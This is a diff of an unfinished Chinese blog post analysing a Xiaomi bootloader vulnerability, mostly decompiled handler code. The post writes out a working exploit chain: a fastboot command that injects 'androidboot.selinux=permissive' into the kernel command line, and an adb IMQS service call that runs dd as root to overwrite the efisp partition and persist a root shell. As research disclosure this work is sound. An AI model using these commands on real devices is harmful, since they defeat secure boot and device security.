@@ -16,13 +16,11 @@ description: "Xiaomi变印度厂了，熬的小米粥变成恒河汤了"
 ## 前言
 小米存在一个OEM指令`set-gpu-preemption`，而这个指令存在命令参数注入`kernel cmdline`的漏洞，实际使用如下：
 ```
-# the second argument could cause overflow. This is what we are talking about today
-fastboot oem set-gpu-preemption value 0 androidboot.selinux=permissive
+# the second argument could cause argument injection. This is what we are talking about today
+fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
 fastboot continue 
 
-# Once commands above done, machine would boot with screen blacked, but ADB is usable. If use "set-gpu-preemption-value 0" instead, screen is ok
-
-# This is exploiting IMQS(a MI service) to get root, this calling has root permission, dd command means to exploit the GBL boot vulnerable to persist the root shell.
+# This is exploiting IMQS(a MI service) to get root, this calling has root permission, dd command means to exploit the GBL boot vulnerable to persist the root shell. 3 vulnerables in a row, causing all secureboot chain collapsed.
 adb shell 'service call miui.mqsas.IMQSNative 21 i32 1 s16 "dd" i32 1 s16 "if=/data/local/tmp/linuxloader_unlock.efi of=/dev/block/by-name/efisp" s16 "/data/mqsas/log.txt" i32 60'
 ```
 
@@ -58,12 +56,13 @@ void fb_oem_set_gpu_preemption(void)
   for (; (len = AsciiStrLen((long)userinput), len  != 0 && (*userinput == 0x20));
       userinput = userinput + 1) {
   }
+  
   len = AsciiStrLen((long)userinput);
   if (len == 1) {
     uVar2 = 0x2f < (*userinput & 0xfe);
     uVar3 = (*userinput & 0xfe) == 0x30;
     if ((bool)uVar3) {
-      puVar5 = (undefined *)AsciiStrLen((long)unaff _x19);
+      puVar5 = (undefined *)AsciiStrLen((long)unaff_x19);
       AsciiStrCatS(buf_msg,0x100,(char *)userinput, puVar5);
       pcVar7 = *(code **)(DAT_00103398 + 0x58);
       uVar6 = AsciiStrLen((long)buf_msg);
@@ -159,16 +158,16 @@ undefined8 AsciiStrCatS(char *param_1,undefined  *param_2,char *param_3,undefine
               pcVar4 = param_3 + (long)puVar5 + 1;
               in_ZR = bVar2 && pcVar4 == param_1;
               if (bVar2 && param_1 < pcVar4) {
-                FUN_00001efc("/home/work/mnt/miui_codes1/build_home_rom-odm-merged/kernel_platform/out/bazel/output_user_root/b197 0bca595d87272e733a0c3ce8a31e/sandbox/processwrapper-sandbox/142/execroot/_m ain/bootable/bootloader/edk2/MdePkg/Library/BaseLib/SafeString.c"
+                FUN_00001efc("/home/work/mnt/miui_codes1/build_home_rom-odm-merged/kernel_platform/out/bazel/output_user_root/b1970bca595d87272e733a0c3ce8a31e/sandbox/processwrapper-sandbox/142/execroot/_main/bootable/bootloader/edk2/MdePkg/Library/BaseLib/SafeString.c"
                              ,0x84b,
-                             "InternalSafeStringNoAsciiStrOverlap  (Destination, DestMax, (CHAR8 *)Source, SourceLen + 1)"
+                             "InternalSafeStringNoAsciiStrOverlap (Destination, DestMax, (CHAR8 *)Source, SourceLen + 1)"
                             );
               }
               else {
                 pcVar1 = param_1 + (long)param_2;
                 in_ZR = param_3 >= param_1 && pcVar1 == param_3;
                 if (((param_3 < param_1 || pcVar1 <= param_ 3) ||
-                    (FUN_00001efc("/home/work/mnt/miui_codes1/build_home_rom-odm-merged/ker nel_platform/out/bazel/output_user_root /b1970bca595d87272e733a0c3ce8a31e/s andbox/processwrapper-sandbox/142/exe croot/_main/bootable/bootloader/edk2/M dePkg/Library/BaseLib/SafeString.c"
+                    (FUN_00001efc("/home/work/mnt/miui_codes1/build_home_rom-odm-merged/kernel_platform/out/bazel/output_user_root /b1970bca595d87272e733a0c3ce8a31e/s andbox/processwrapper-sandbox/142/exe croot/_main/bootable/bootloader/edk2/M dePkg/Library/BaseLib/SafeString.c"
                                   ,0x84b,
                                   "InternalSafeStringNoAsciiStrOverlap (Destination, DestMax, (CHAR8 *)Source, SourceLen + 1)"
                                  ), !bVar2 || pcVar4 <= param_1)) &&
@@ -196,7 +195,7 @@ undefined8 AsciiStrCatS(char *param_1,undefined  *param_2,char *param_3,undefine
       }
       else {
         pcVar4 = 
-        "/home/work/mnt/miui_codes1/build_home_ro m-odm-merged/kernel_platform/out/bazel/outp ut_user_root/b1970bca595d87272e733a0c3ce8 a31e/sandbox/processwrapper-sandbox/142/execroot/_main/bootable/bootloader/edk2/MdePkg/Library/BaseLib/SafeString.c";
+        "/home/work/mnt/miui_codes1/build_home_rom-odm-merged/kernel_platform/out/bazel/outp ut_user_root/b1970bca595d87272e733a0c3ce8 a31e/sandbox/processwrapper-sandbox/142/execroot/_main/bootable/bootloader/edk2/MdePkg/Library/BaseLib/SafeString.c";
         uVar6 = 0x830;
       }
     }
@@ -253,8 +252,8 @@ void fb_oem_set_gpu_preemption(void)
 		if (!(bool)in_ZR) break;
 		user_input = user_input + 1;
 	}
-	n = (undefined *)AsciiStrLen((long)unaff_x 19);
-	AsciiStrCatS(buf_msg,IMAGE_DOS_HEADER_ 00000000.e_program + 0xc0,(char *)user_input,n);
+	n = (undefined *)AsciiStrLen((long)user_input);
+	AsciiStrCatS(buf_msg,IMAGE_DOS_HEADER_00000000.e_program + 0xc0,(char *)user_input,n);
 	pcVar3 = *(code **)(DAT_001063f0 + 0x58);
 	AsciiStrLen((long)buf_msg);
 	FUN_00062d84();
@@ -268,7 +267,7 @@ void fb_oem_set_gpu_preemption(void)
 		if (n + -10 < (undefined *)0xfffffffffffffff5) {
 		FUN_00003900();
 	}
-	AsciiStrCatS(buf_log,IMAGE_DOS_HEADER_ 00000000.e_program,": failed!",n);
+	AsciiStrCatS(buf_log,IMAGE_DOS_HEADER_00000000.e_program,": failed!",n);
 	FUN_00059084();
 	}
 	else {
@@ -277,7 +276,7 @@ void fb_oem_set_gpu_preemption(void)
 		if (!(bool)in_CY || (bool)in_ZR) {
 			FUN_00003900();
 		}
-		AsciiStrCatS(buf_log,IMAGE_DOS_HEADER_ 00000000.e_program,": done",n);
+		AsciiStrCatS(buf_log,IMAGE_DOS_HEADER_00000000.e_program,": done",n);
 		FUN_00059198();
 	}
 	FUN_000626f8();
@@ -392,9 +391,18 @@ EFI_STATUS SetVariable (
 ```
 
 
+对于代码：
+
+```c
+FUN_000029f0(acStack_168,IMAGE_DOS_HEADER_00000000.e_program + 0xc0,(char *)unaff_x19,puVa r2);
+```
+
+反编译显示 handler 调用 `AsciiStrnCatS(buf_msg, DestMax, user_input, AsciiStrLen(user_input))` 。 该函数即 EDK2 SafeString 库中的标准实现，4 参数，语义是: 实际拷贝字节数 = `min(Length, DestMax - AsciiStrLen(Destination) - 1)`
+
+第 2 个参数 DestMax 在反编译中显示为 IMAGE_DOS_HEADER_00000000.e_program + 0xc0, 这是 Ghidra 在 PE 头零页上误应用 IMAGE_DOS_HEADER 结构体类型造成的反编译伪影, 真实值
 ## PS
 还未完成，但是先发出来了。
 //TODO 
 - 重新追 `GpuConfiguration` 读取侧去看cmdline具体拼接进行佐证。
-- 目前卡在Ghidra自动分析的 IMAGE_DOS_HEADER 这里，还原了字符串又查表，还上网查这个东西怎么会有`e.program` 属性。最终猜测它写的这个应该是纯数值`0x40` ，检查调用的 `000029f0` 应该不是原先猜测的 `AsciiStrCpyS` 函数，应该是`InternalSafeStringNoAsciiStrOverlap` 函数（暂时还拿不准，但是`AsciiStrCpyS` 应该不对，找了edk2源码，这个是3输入参数。逆向的这个函数是4参数），但是在确定究竟是什么之前先不改。
+- 目前卡在Ghidra自动分析的 IMAGE_DOS_HEADER 这里，还原了字符串又查表，还上网查这个东西怎么会有`e.program` 属性。最终猜测它写的这个应该是纯数值`0x40` ，检查调用的 `000029f0` 经过比对应该是 `AsciiStrnCatS` 函数
 - 对AI的吐槽：Claude全身敏感肌，没思路问问方向都不行。DeepSeekV4满口胡言乱语，在制表上帮了忙。Gemini不干活成天夸NCC观察力非常敏锐。GPT能力不行还保守。总的来说还是NCC好，就是太费NCC脑子了。
